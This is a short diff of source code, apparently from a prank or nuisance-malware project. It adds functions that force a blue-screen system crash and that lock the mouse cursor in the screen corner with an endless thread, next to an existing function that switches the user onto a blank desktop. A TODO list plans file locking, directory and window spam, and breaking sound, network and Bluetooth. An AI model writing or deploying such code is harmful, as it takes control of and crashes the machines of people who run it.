@@ -56,11 +56,32 @@ dfa NT DumbDeskBreakVoid()
 {
     SwitchDesktop(CreateDesktopW(L"DumbDeskBreakVoid", NUL, NUL, 0, DESKTOP_CREATEWINDOW | GENERIC_ALL, NUL));
 }
+dfa NT DumbSysStopBlue()
+{
+    SysBsod();
+}
+dfa NT DumbSysCurBreak()
+{
+    Thd thd;
+    thd.Start(
+        [](LPVOID p) {
+            while (YES)
+                SysCurPosMove(Pos2<F4>(0, 0));
+            ret DWORD(0);
+            unused(p);
+        },
+        NUL);
+    thd.__Drop();
+}
+
 // TODO:
 // DumbScnBreakSize
 // DumbFileLockSelf
 // DumbDirSpam
 // DumbWinSpam
-// DumbSysStopBlue
+// DumbSndBreak
+// DumbNetBreak
+// DumbBluetoothBreak
+// DumbPersonalBreak
 
 #endif
